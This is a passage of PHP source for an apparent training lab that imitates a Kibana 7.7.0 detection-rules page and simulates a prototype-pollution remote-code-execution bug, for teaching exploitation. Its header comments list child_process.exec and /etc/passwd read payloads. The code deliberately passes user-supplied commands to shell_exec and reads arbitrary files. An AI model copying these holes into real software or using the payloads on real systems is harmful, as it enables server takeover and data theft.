<?php
// Lab 1102 — Kibana 7.7.0 RCE via Prototype Pollution in SIEM ML Signal Processing
// HackerOne Report #861744 (Elastic)
// Vulnerability: influencer_field_name = "foo.__proto__.sourceURL" → poisons Object.prototype
// → SIEM detection rule fires every 15s → eval picks up sourceURL → arbitrary code executes
// RCE payloads:
//   process.env.FLAG                                              → flag
//   require('child_process').exec('id')                          → uid=...
//   global.process.mainModule.require('child_process').exec('CMD')
//   require('fs').readFileSync('/etc/passwd')                     → file read

session_start();

// ── Env / process simulation (exposed via process.env.VARIABLE) ──────────
$simulated_env = [
    'FLAG'          => 'flag{kibana_prototype_pollution_rce_861744}',
    'NODE_ENV'      => 'production',
    'ELASTIC_HOST'  => 'http://localhost:9200',
    'KIBANA_HOME'   => '/usr/share/kibana',
    'KIBANA_PASS'   => 'kibana_s0_s3cr3t_2020!',
    'HOME'          => '/usr/share/kibana',
    'PATH'          => '/usr/share/kibana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
    'XPACK_SEC_KEY' => 'xpack-security-key-2020-elastic',
];

// ── Helpers ───────────────────────────────────────────────────────────────
function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── Vulnerable deep-merge (simulates lodash/Object.assign without __proto__ guard) ──
function merge_objects(&$target, $source, &$proto_ref) {
    if (!is_array($source)) return;
    foreach ($source as $key => $value) {
        if ((string)$key === '__proto__') {
            // VULNERABLE: should sanitize __proto__ key but does not
            if (is_array($value)) {
                foreach ($value as $pk => $pv) {
                    $proto_ref[$pk] = $pv; // Object.prototype[pk] = pv
                }
            }
        } elseif (is_array($value)) {
            // Always recurse into nested arrays — required to reach __proto__ key in path
            if (!isset($target[$key]) || !is_array($target[$key])) {
                $target[$key] = [];
            }
            merge_objects($target[$key], $value, $proto_ref);
        } else {
            $target[$key] = $value;
        }
    }
}

function build_nested(array $parts, $value) {
    if (count($parts) === 1) return [$parts[0] => $value];
    $key = array_shift($parts);
    return [$key => build_nested($parts, $value)];
}

// ── process_ml_signals — PHP simulation of bulk_create_ml_signals.ts ────
function process_ml_signals($doc_json, &$proto_ref, &$rce_result, &$trace) {
    $proto_ref  = [];
    $rce_result = null;
    $trace      = [];

    $doc = json_decode($doc_json, true);
    if (!$doc || !isset($doc['influencers'])) {
        $trace[] = ['type' => 'info', 'msg' => 'No influencer fields found in anomaly document'];
        return false;
    }

    $trace[] = ['type' => 'info', 'msg' => 'Processing ' . count($doc['influencers']) . ' influencer(s) from ML anomaly...'];

    $signal_source = [];
    foreach ($doc['influencers'] as $idx => $inf) {
        $field_name  = (string)($inf['influencer_field_name']  ?? '');
        $field_value = (string)($inf['influencer_field_values'] ?? '');

        $trace[] = ['type' => 'step', 'msg' => "influencer[$idx]: field_name=" . json_encode($field_name) . " field_values=" . mb_substr(json_encode($field_value), 0, 80)];

        $parts  = explode('.', $field_name);
        $nested = build_nested($parts, $field_value);

        $trace[] = ['type' => 'code', 'msg' => 'merge_objects(signalSource, ' . json_encode($nested) . ')'];
        merge_objects($signal_source, $nested, $proto_ref);
    }

    if (!empty($proto_ref)) {
        foreach ($proto_ref as $pk => $pv) {
            $trace[] = ['type' => 'warn', 'msg' => "⚠ Prototype polluted: Object.prototype[\"$pk\"] = " . mb_substr(json_encode($pv), 0, 120)];
        }
    }

    if (!empty($proto_ref['sourceURL'])) {
        $trace[] = ['type' => 'warn', 'msg' => '⚠ eval() / Function() picks up sourceURL from prototype chain → code execution triggered'];
        $trace[] = ['type' => 'info', 'msg' => 'Stripping Unicode line/paragraph separators (\\u2028 \\u2029) — JS bypass technique'];
        $rce_result = execute_rce_payload($proto_ref['sourceURL']);
        return true;
    }

    $trace[] = ['type' => 'ok', 'msg' => 'No prototype pollution detected — rule evaluation complete, no signals generated'];
    return false;
}

// ── Node.js RCE payload simulation ──────────────────────────────────────
function execute_rce_payload($source_url) {
    global $simulated_env;

    // Strip Unicode line/paragraph separators (the bypass technique)
    $code = preg_replace('/[\x{2028}\x{2029}]/u', '', $source_url);
    $code = ltrim($code, "\n\r\t ;");

    // Pattern: global.process.mainModule.require('child_process').exec('CMD')
    // or: require('child_process').exec('CMD') / execSync
    if (preg_match(
        "/(?:global\.process\.mainModule\.)?require\(['\"]child_process['\"]\)\.(exec(?:Sync)?)\(\s*['\"](.+?)['\"]\s*\)/s",
        $code, $m
    )) {
        $cmd    = $m[2];
        $output = @shell_exec($cmd . ' 2>&1');
        return ['type' => 'exec', 'cmd' => $cmd, 'method' => $m[1], 'output' => $output ?: '(no output)'];
    }

    // Pattern: process.env.VARIABLE
    if (preg_match('/process\.env\.([A-Z_][A-Z0-9_]*)/', $code, $m)) {
        $var = $m[1];
        return ['type' => 'env', 'var' => $var, 'output' => $simulated_env[$var] ?? '(undefined)'];
    }

    // Pattern: require('fs').readFileSync('/path', ...)
    if (preg_match("/require\(['\"]fs['\"]\)\.readFileSync\(\s*['\"](.+?)['\"]/", $code, $m)) {
        $file   = $m[1];
        $output = @file_get_contents($file);
        if ($output === false) $output = "Error: ENOENT: no such file or directory, open '" . $file . "'";
        return ['type' => 'readfile', 'file' => $file, 'output' => $output];
    }

    // Pattern: process.version
    if (strpos($code, 'process.version') !== false) {
        return ['type' => 'expr', 'output' => 'v12.16.1'];
    }

    // Pattern: console.log('...')
    if (preg_match("/console\.log\(\s*['\"](.+?)['\"]\s*\)/", $code, $m)) {
        return ['type' => 'log', 'output' => $m[1]];
    }

    // Fallback
    return ['type' => 'generic', 'output' => "[RCE CONFIRMED] Node.js runtime executed:\n" . substr($code, 0, 500)];
}

// ── MySQL ────────────────────────────────────────────────────────────────
$db = new mysqli('localhost', 'root', '', 'KrazePlanetLabs_DB');
if ($db->connect_error) die('<p style="padding:32px;font-family:sans-serif">DB error: ' . esc($db->connect_error) . '</p>');

$db->query("CREATE TABLE IF NOT EXISTS lab1102_rules (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    rule_name  VARCHAR(255) NOT NULL,
    rule_json  TEXT NOT NULL,
    enabled    TINYINT(1) DEFAULT 1,
    last_fired DATETIME DEFAULT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$db->query("CREATE TABLE IF NOT EXISTS lab1102_anomalies (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    doc_id     VARCHAR(128) NOT NULL DEFAULT 'my-anomaly',
    doc_json   TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");
$db->query("CREATE TABLE IF NOT EXISTS lab1102_rce_log (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    anomaly_id  INT NOT NULL,
    rce_type    VARCHAR(64),
    rce_output  TEXT,
    proto_key   VARCHAR(128),
    proto_val   TEXT,
    fired_at    DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// Seed the detection rule once
$chk = $db->query("SELECT id FROM lab1102_rules LIMIT 1");
if ($chk->num_rows === 0) {
    $rule_json = json_encode([
        'type'                   => 'machine_learning',
        'machine_learning_job_id'=> 'linux_anomalous_network_activity_ecs',
        'anomaly_threshold'      => 0,
        'interval'               => '15s',
        'from'                   => 'now-108015s',
        'max_signals'            => 100,
        'risk_score'             => 50,
        'severity'               => 'low',
        'output_index'           => '.siem-signals-default',
        'rule_id'                => '2a5a3f8e-79a9-4101-99d9-b414ed48c0db',
    ]);
    $ins = $db->prepare("INSERT INTO lab1102_rules (rule_name, rule_json, enabled) VALUES (?,?,1)");
    $n   = 'Linux Anomalous Network Activity';
    $ins->bind_param('ss', $n, $rule_json);
    $ins->execute();
    $ins->close();
}

// ── Fetch rule ─────────────────────────────────────────────────────────────
$rule = $db->query("SELECT * FROM lab1102_rules ORDER BY id LIMIT 1")->fetch_assoc();

// ── POST handlers ──────────────────────────────────────────────────────────
$action_msg  = '';
$trace       = [];
$proto_ref   = [];
$rce_result  = null;
$rce_fired   = false;
$last_log    = null;
$doc_json_display = json_encode([
    'timestamp'      => 1588093630045,
    'result_type'    => 'record',
    'record_score'   => 1,
    'job_id'         => 'linux_anomalous_network_activity_ecs',
    'by_field_name'  => 'process.name',
    'by_field_value' => 'python3',
    'influencers'    => [
        ['influencer_field_name' => 'process.name', 'influencer_field_values' => 'python3'],
    ],
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'toggle_rule') {
        $new = $rule['enabled'] ? 0 : 1;
        $db->query("UPDATE lab1102_rules SET enabled=$new WHERE id=" . (int)$rule['id']);
        $rule['enabled'] = $new;
        $action_msg = $new ? 'Rule enabled.' : 'Rule disabled.';
    }

    elseif ($action === 'index_anomaly') {
        $raw_json = trim($_POST['doc_json'] ?? '');
        $doc_json_display = $raw_json;

        if ($raw_json === '' || !json_decode($raw_json)) {
            $action_msg = 'Invalid JSON document.';
        } else {
            // Store anomaly
            $ins = $db->prepare("INSERT INTO lab1102_anomalies (doc_json) VALUES (?)");
            $ins->bind_param('s', $raw_json);
            $ins->execute();
            $anomaly_id = $db->insert_id;
            $ins->close();

            $action_msg = 'Document indexed. Rule evaluated.';

            if ($rule['enabled']) {
                // Rule fires — process the anomaly
                $rce_fired = process_ml_signals($raw_json, $proto_ref, $rce_result, $trace);

                // Update last_fired
                $db->query("UPDATE lab1102_rules SET last_fired=NOW() WHERE id=" . (int)$rule['id']);
                $rule['last_fired'] = date('Y-m-d H:i:s');

                // Store RCE log
                $rce_type   = $rce_result['type'] ?? null;
                $rce_output = $rce_result ? ($rce_result['output'] ?? null) : null;
                $proto_key  = !empty($proto_ref) ? implode(',', array_keys($proto_ref)) : null;
                $proto_val  = !empty($proto_ref) ? json_encode($proto_ref) : null;
                $upd = $db->prepare("INSERT INTO lab1102_rce_log (anomaly_id,rce_type,rce_output,proto_key,proto_val) VALUES (?,?,?,?,?)");
                $upd->bind_param('issss', $anomaly_id, $rce_type, $rce_output, $proto_key, $proto_val);
                $upd->execute();
                $upd->close();
            } else {
                $trace[] = ['type' => 'warn', 'msg' => 'Rule is disabled — evaluation skipped'];
            }
        }
    }

    elseif ($action === 'clear_log') {
        $db->query("DELETE FROM lab1102_rce_log");
        $db->query("DELETE FROM lab1102_anomalies");
        $action_msg = 'Log cleared.';
    }
}

// Fetch last RCE log entry
$last_log_row = $db->query("SELECT * FROM lab1102_rce_log ORDER BY id DESC LIMIT 1")->fetch_assoc();
$anomaly_count = $db->query("SELECT COUNT(*) c FROM lab1102_anomalies")->fetch_assoc()['c'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Detection rules — Kibana</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#0A1628;color:#DFE5EF;font-size:13px;min-height:100vh;display:flex;flex-direction:column;}

/* ── Top nav ─────────────────────────────────────────────────────────── */
.k-topnav{background:#06101C;border-bottom:1px solid #1C3050;height:49px;display:flex;align-items:center;padding:0 16px;gap:16px;position:sticky;top:0;z-index:200;flex-shrink:0;}
.k-logo{display:flex;align-items:center;gap:8px;text-decoration:none;flex-shrink:0;}
.k-logo-icon{width:24px;height:24px;background:linear-gradient(135deg,#F04E98,#0077CC);border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:900;color:#fff;font-style:italic;}
.k-logo-text{font-size:.82rem;font-weight:600;color:#DFE5EF;letter-spacing:.02em;}
.k-logo-text em{color:#0077CC;font-style:normal;}
.k-topnav-divider{width:1px;height:24px;background:#1C3050;}
.k-breadcrumb{font-size:.75rem;color:#5D7898;display:flex;align-items:center;gap:6px;flex:1;}
.k-breadcrumb a{color:#5D7898;text-decoration:none;}
.k-breadcrumb a:hover{color:#0077CC;}
.k-breadcrumb .sep{color:#2E4A6A;}
.k-breadcrumb .cur{color:#DFE5EF;font-weight:600;}
.k-nav-pills{display:flex;align-items:center;gap:8px;}
.k-nav-pill{display:flex;align-items:center;gap:6px;font-size:.72rem;color:#5D7898;cursor:pointer;padding:4px 8px;border-radius:3px;}
.k-nav-pill:hover{background:rgba(255,255,255,.06);color:#DFE5EF;}
.k-nav-pill svg{width:12px;height:12px;stroke:currentColor;fill:none;}
.user-pill{font-size:.72rem;color:#DFE5EF;background:#1C3050;padding:4px 10px;border-radius:12px;display:flex;align-items:center;gap:5px;}
.user-pill::before{content:'';width:7px;height:7px;background:#00BFB3;border-radius:50%;}

/* ── Page shell ──────────────────────────────────────────────────────── */
.k-shell{display:flex;flex:1;overflow:hidden;}

/* ── Left sidebar ────────────────────────────────────────────────────── */
.k-sidebar{background:#06101C;border-right:1px solid #1C3050;width:48px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;padding:8px 0;gap:2px;}
.k-nav-item{width:36px;height:36px;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#5D7898;transition:all .15s;position:relative;}
.k-nav-item:hover{background:rgba(255,255,255,.06);color:#DFE5EF;}
.k-nav-item.active{background:#0D2544;color:#0077CC;}
.k-nav-item svg{width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:1.5;}
.k-nav-sep{width:28px;height:1px;background:#1C3050;margin:4px 0;}

/* ── Main content ─────────────────────────────────────────────────────── */
.k-main{flex:1;overflow-y:auto;padding:20px 24px 40px;}

/* ── Page header ──────────────────────────────────────────────────────── */
.k-page-hd{margin-bottom:20px;}
.k-page-title{font-size:1.1rem;font-weight:700;color:#F5F7FA;margin-bottom:3px;display:flex;align-items:center;gap:10px;}
.k-page-sub{font-size:.76rem;color:#5D7898;}

/* ── Cards ────────────────────────────────────────────────────────────── */
.k-card{background:#0F1F36;border:1px solid #1C3050;border-radius:6px;margin-bottom:16px;overflow:hidden;}
.k-card-hd{padding:12px 16px;border-bottom:1px solid #1C3050;display:flex;align-items:center;justify-content:space-between;gap:10px;}
.k-card-title{font-size:.84rem;font-weight:700;color:#F5F7FA;display:flex;align-items:center;gap:8px;}
.k-card-title svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;}
.k-card-title .ct-blue{color:#0077CC;}
.k-card-title .ct-teal{color:#00BFB3;}
.k-card-title .ct-red{color:#BD271E;}
.k-card-body{padding:16px;}
.k-card-actions{display:flex;align-items:center;gap:8px;}

/* ── Buttons ──────────────────────────────────────────────────────────── */
.k-btn{display:inline-flex;align-items:center;gap:6px;border:none;border-radius:4px;padding:7px 14px;font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;transition:all .15s;}
.k-btn svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0;}
.k-btn-primary{background:#0077CC;color:#fff;}
.k-btn-primary:hover{background:#0065B3;}
.k-btn-success{background:#007157;color:#fff;}
.k-btn-success:hover{background:#005F47;}
.k-btn-danger{background:#7B1C1C;color:#F8B4B4;border:1px solid #BD271E;}
.k-btn-danger:hover{background:#9B2222;}
.k-btn-ghost{background:transparent;color:#5D7898;border:1px solid #2E4A6A;}
.k-btn-ghost:hover{background:#0D2544;color:#DFE5EF;}
.k-btn-sm{padding:5px 10px;font-size:.72rem;}
.k-btn:disabled{opacity:.4;cursor:not-allowed;}

/* ── Badges ───────────────────────────────────────────────────────────── */
.badge{display:inline-flex;align-items:center;gap:4px;padding:2px 7px;border-radius:3px;font-size:.66rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;}
.badge-low{background:#0A2A1A;color:#30BF78;border:1px solid #145A32;}
.badge-enabled{background:#072A1C;color:#00BFB3;border:1px solid #0A4A35;}
.badge-disabled{background:#1C1C1C;color:#5D7898;border:1px solid #2E4A6A;}
.badge-ml{background:#0D1F40;color:#6BA4D6;border:1px solid #1C3A6A;}
.badge-critical{background:#3B0000;color:#FF8787;border:1px solid #BD271E;}
.badge-rce{background:#2A0A35;color:#CF9FFF;border:1px solid #6B2FA0;animation:pulse-rce 1.5s infinite;}
@keyframes pulse-rce{0%,100%{box-shadow:0 0 0 0 rgba(107,47,160,.4);}50%{box-shadow:0 0 0 4px rgba(107,47,160,.1);}}

/* ── Table ────────────────────────────────────────────────────────────── */
.k-table{width:100%;border-collapse:collapse;font-size:.78rem;}
.k-table th{background:#0A1628;color:#5D7898;font-weight:700;text-transform:uppercase;letter-spacing:.06em;font-size:.64rem;padding:8px 12px;text-align:left;border-bottom:1px solid #1C3050;}
.k-table td{padding:10px 12px;border-bottom:1px solid rgba(28,48,80,.5);vertical-align:middle;}
.k-table tr:last-child td{border-bottom:none;}
.k-table tr:hover td{background:rgba(255,255,255,.02);}
.rule-name{font-weight:700;color:#F5F7FA;display:flex;align-items:center;gap:6px;}
.rule-name svg{width:12px;height:12px;fill:currentColor;color:#0077CC;}
.rule-type{font-size:.7rem;color:#5D7898;margin-top:2px;}
.last-fired{font-size:.74rem;color:#5D7898;}

/* ── Dev Tools panel ─────────────────────────────────────────────────── */
.devtools-bar{display:flex;align-items:center;gap:8px;background:#050F1E;border:1px solid #1C3050;border-radius:4px;padding:7px 12px;margin-bottom:10px;font-family:'Courier New',monospace;font-size:.76rem;}
.method-badge{background:#1A4A1A;color:#3AC97B;padding:2px 7px;border-radius:3px;font-weight:900;font-size:.7rem;flex-shrink:0;}
.devtools-url{color:#6BA4D6;flex:1;word-break:break-all;}
.json-editor{width:100%;background:#030D1A;border:1px solid #1C3050;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:.76rem;color:#A8CC88;line-height:1.7;resize:vertical;min-height:220px;outline:none;transition:border-color .15s;}
.json-editor:focus{border-color:#0077CC;}
.response-panel{background:#030D1A;border:1px solid #1C3050;border-radius:4px;padding:12px;font-family:'Courier New',monospace;font-size:.74rem;color:#6BA4D6;line-height:1.7;margin-top:10px;}
.response-status{color:#3AC97B;font-weight:700;margin-bottom:4px;}

/* ── RCE Log ─────────────────────────────────────────────────────────── */
.rce-terminal{background:#030D1A;border:1px solid #1C3050;border-radius:4px;padding:14px;font-family:'Courier New',monospace;font-size:.76rem;line-height:1.9;max-height:420px;overflow-y:auto;}
.log-info{color:#5D7898;}
.log-step{color:#6BA4D6;}
.log-code{color:#A8CC88;}
.log-warn{color:#F5A700;}
.log-ok{color:#00BFB3;}
.log-rce{color:#CF9FFF;font-weight:700;}
.log-err{color:#BD271E;}
.rce-output-box{background:#06001A;border:1px solid #6B2FA0;border-radius:4px;padding:12px;margin-top:10px;font-family:'Courier New',monospace;font-size:.78rem;color:#E0CFFF;white-space:pre-wrap;word-break:break-all;}
.rce-output-label{font-size:.64rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#6B2FA0;margin-bottom:6px;}

/* ── Payload reference ───────────────────────────────────────────────── */
.payload-ref{background:#0A1628;border:1px solid #1C3050;border-radius:4px;padding:12px;font-size:.74rem;}
.payload-ref-title{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#5D7898;margin-bottom:10px;}
.payload-item{margin-bottom:12px;}
.payload-item-lbl{color:#5D7898;font-size:.7rem;margin-bottom:4px;}
.payload-code{background:#030D1A;border:1px solid #1C3050;border-radius:3px;padding:8px 10px;font-family:'Courier New',monospace;font-size:.72rem;color:#A8CC88;white-space:pre-wrap;word-break:break-all;cursor:pointer;transition:border-color .15s;}
.payload-code:hover{border-color:#0077CC;}
.payload-code .hi-proto{color:#F87171;font-weight:700;}
.payload-code .hi-val{color:#F5A700;}
.payload-code .hi-key{color:#6BA4D6;}

/* ── Alert box ────────────────────────────────────────────────────────── */
.k-alert{padding:10px 14px;border-radius:4px;font-size:.78rem;margin-bottom:14px;display:flex;align-items:center;gap:8px;}
.k-alert-info{background:#041828;border:1px solid #0D4A7A;color:#6BA4D6;}
.k-alert-success{background:#021C10;border:1px solid #0A3A2A;color:#3AC97B;}
.k-alert-danger{background:#1C0505;border:1px solid #5A1010;color:#F87171;}

/* ── Two-column layout ───────────────────────────────────────────────── */
.k-2col{display:grid;grid-template-columns:1fr 320px;gap:16px;align-items:start;}
@media(max-width:900px){.k-2col{grid-template-columns:1fr;}}

/* ── Report panel ────────────────────────────────────────────────────── */
.report-panel{background:#0F1F36;border:1px solid #1C3050;border-radius:6px;padding:14px 16px;margin-top:16px;font-size:.74rem;}
.report-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(155px,1fr));gap:10px;}
.ri-lbl{font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#2E4A6A;margin-bottom:2px;}
.ri-val{font-size:.76rem;color:#DFE5EF;font-weight:600;}
.ri-val a{color:#0077CC;text-decoration:none;}
.ri-val a:hover{text-decoration:underline;}
.sev-badge{background:#1A0A0A;color:#FF8787;border:1px solid #5A1010;padding:1px 7px;border-radius:3px;font-size:.7rem;font-weight:700;}

/* ── Forms ────────────────────────────────────────────────────────────── */
.form-hint{font-size:.68rem;color:#2E4A6A;margin-top:4px;}

/* ── Footer ───────────────────────────────────────────────────────────── */
footer{background:#06101C;border-top:1px solid #1C3050;padding:12px 24px;font-size:.68rem;color:#2E4A6A;display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;}
footer a{color:#2E4A6A;text-decoration:none;}
footer a:hover{color:#0077CC;}
</style>
</head>
<body>

<!-- Top nav -->
<nav class="k-topnav">
  <a href="1102.php" class="k-logo">
    <div class="k-logo-icon">e</div>
    <span class="k-logo-text">kibana</span>
  </a>
  <div class="k-topnav-divider"></div>
  <div class="k-breadcrumb">
    <a href="#">Security</a><span class="sep">›</span>
    <a href="#">Detections</a><span class="sep">›</span>
    <span class="cur">Detection rules</span>
  </div>
  <div class="k-nav-pills">
    <div class="k-nav-pill">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
    </div>
    <div class="k-nav-pill" style="font-size:.72rem;">Kibana 7.7.0</div>
    <div class="user-pill">elastic</div>
  </div>
</nav>

<div class="k-shell">

  <!-- Left sidebar -->
  <div class="k-sidebar">
    <div class="k-nav-item" title="Discover">
      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
    </div>
    <div class="k-nav-item" title="Dashboard">
      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
    </div>
    <div class="k-nav-item" title="Canvas">
      <svg viewBox="0 0 24 24"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
    </div>
    <div class="k-nav-sep"></div>
    <div class="k-nav-item active" title="Security">
      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    </div>
    <div class="k-nav-item" title="Machine Learning">
      <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
    </div>
    <div class="k-nav-sep"></div>
    <div class="k-nav-item" title="Dev Tools">
      <svg viewBox="0 0 24 24"><path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/></svg>
    </div>
    <div class="k-nav-item" title="Management">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14"/></svg>
    </div>
  </div>

  <!-- Main content -->
  <main class="k-main">
    <div class="k-2col">

      <!-- Left column -->
      <div>
        <div class="k-page-hd">
          <div class="k-page-title">
            <svg style="width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2;" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            Detection rules
            <span class="badge badge-ml">Kibana 7.7.0</span>
          </div>
          <div class="k-page-sub">SIEM Detection Engine — Machine Learning rule evaluation via <code style="color:#A8CC88;font-size:.72rem;">bulk_create_ml_signals.ts</code></div>
        </div>

        <?php if ($action_msg): ?>
        <div class="k-alert k-alert-info"><?= esc($action_msg) ?></div>
        <?php endif; ?>

        <!-- Panel 1: Detection Rules -->
        <div class="k-card">
          <div class="k-card-hd">
            <div class="k-card-title">
              <svg class="ct-blue" viewBox="0 0 24 24"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18"/></svg>
              Detection Rules
            </div>
            <div class="k-card-actions">
              <span style="font-size:.72rem;color:#5D7898;"><?= $anomaly_count ?> anomalie(s) indexed</span>
              <button class="k-btn k-btn-ghost k-btn-sm" disabled>+ Create new rule</button>
            </div>
          </div>
          <table class="k-table">
            <thead>
              <tr>
                <th>Rule name</th>
                <th>Type</th>
                <th>Severity</th>
                <th>Status</th>
                <th>Last response</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>
                  <div class="rule-name">
                    <svg viewBox="0 0 24 24"><path d="M14 10l-2 1m0 0l-2-1m2 1v2.5M20 7l-2 1m2-1l-2-1m2 1v2.5M14 4l-2-1-2 1M4 7l2-1M4 7l2 1M4 7v2.5M12 21l-2-1m2 1l2-1m-2 1v-2.5M6 18l-2-1v-2.5M20 18l2-1v-2.5"/></svg>
                    <?= esc($rule['rule_name']) ?>
                  </div>
                  <div class="rule-type">ML Job: linux_anomalous_network_activity_ecs · interval: 15s</div>
                </td>
                <td><span class="badge badge-ml">Machine Learning</span></td>
                <td><span class="badge badge-low">Low</span></td>
                <td>
                  <?php if ($rule['enabled']): ?>
                  <span class="badge badge-enabled">● Enabled</span>
                  <?php else: ?>
                  <span class="badge badge-disabled">○ Disabled</span>
                  <?php endif; ?>
                </td>
                <td class="last-fired">
                  <?= $rule['last_fired'] ? 'Fired: ' . esc($rule['last_fired']) : '—' ?>
                </td>
                <td>
                  <form method="POST" style="display:inline;">
                    <input type="hidden" name="action" value="toggle_rule">
                    <?php if ($rule['enabled']): ?>
                    <button type="submit" class="k-btn k-btn-ghost k-btn-sm">Disable</button>
                    <?php else: ?>
                    <button type="submit" class="k-btn k-btn-success k-btn-sm">Enable</button>
                    <?php endif; ?>
                  </form>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        <!-- Panel 2: Elasticsearch API / Anomaly Injection -->
        <div class="k-card">
          <div class="k-card-hd">
            <div class="k-card-title">
              <svg class="ct-teal" viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
              Elasticsearch API — Index ML Anomaly Document
            </div>
            <span style="font-size:.68rem;color:#5D7898;">Step 2 — craft the malicious anomaly document</span>
          </div>
          <div class="k-card-body">
            <div class="devtools-bar">
              <span class="method-badge">PUT</span>
              <span class="devtools-url">/.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh</span>
            </div>
            <form method="POST" action="1102.php">
              <input type="hidden" name="action" value="index_anomaly">
              <textarea name="doc_json" class="json-editor" spellcheck="false"><?= esc($doc_json_display) ?></textarea>
              <div class="form-hint">Edit influencer_field_name to inject prototype pollution payload. See payload reference →</div>
              <div style="display:flex;gap:8px;margin-top:10px;align-items:center;">
                <button type="submit" class="k-btn k-btn-primary">
                  <svg viewBox="0 0 24 24"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg>
                  Send Request
                </button>
                <?php if ($anomaly_count > 0): ?>
                <form method="POST" style="display:inline;">
                  <input type="hidden" name="action" value="clear_log">
                  <button type="submit" class="k-btn k-btn-ghost k-btn-sm">Clear log</button>
                </form>
                <?php endif; ?>
                <span style="font-size:.72rem;color:<?= $rule['enabled'] ? '#00BFB3' : '#F5A700' ?>">
                  <?= $rule['enabled'] ? '● Rule will fire on submit' : '⚠ Rule disabled — enable first' ?>
                </span>
              </div>
            </form>
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'index_anomaly' && $action_msg !== 'Invalid JSON document.'): ?>
            <div class="response-panel">
              <div class="response-status">HTTP/1.1 201 Created</div>
              <div><?= json_encode(['result' => 'created', '_id' => 'my-anomaly', '_index' => '.ml-anomalies-custom-linux_anomalous_network_activity_ecs', '_version' => 1, 'forced_refresh' => true], JSON_PRETTY_PRINT) ?></div>
            </div>
            <?php endif; ?>
          </div>
        </div>

        <!-- Panel 3: Rule Execution Log -->
        <?php if (!empty($trace) || $last_log_row): ?>
        <div class="k-card">
          <div class="k-card-hd">
            <div class="k-card-title">
              <svg class="ct-red" viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
              Rule Execution Log — Signals
            </div>
            <div class="k-card-actions">
              <?php if ($rce_fired): ?>
              <span class="badge badge-rce">RCE DETECTED</span>
              <span class="badge badge-critical">CRITICAL</span>
              <?php elseif (!empty($trace)): ?>
              <span class="badge badge-enabled">CLEAN</span>
              <?php endif; ?>
            </div>
          </div>
          <div class="k-card-body">
            <?php if (!empty($trace)): ?>
            <div style="font-size:.68rem;color:#5D7898;margin-bottom:8px;">
              Timestamp: <?= date('Y-m-dTH:i:s.000') ?>Z · Rule: "<?= esc($rule['rule_name']) ?>"
            </div>
            <div class="rce-terminal">
              <?php foreach ($trace as $t): ?>
              <?php
              $cls  = 'log-' . ($t['type'] ?? 'info');
              $pref = match($t['type'] ?? 'info') {
                  'step' => '  ↳ ',
                  'code' => '  ↳ ',
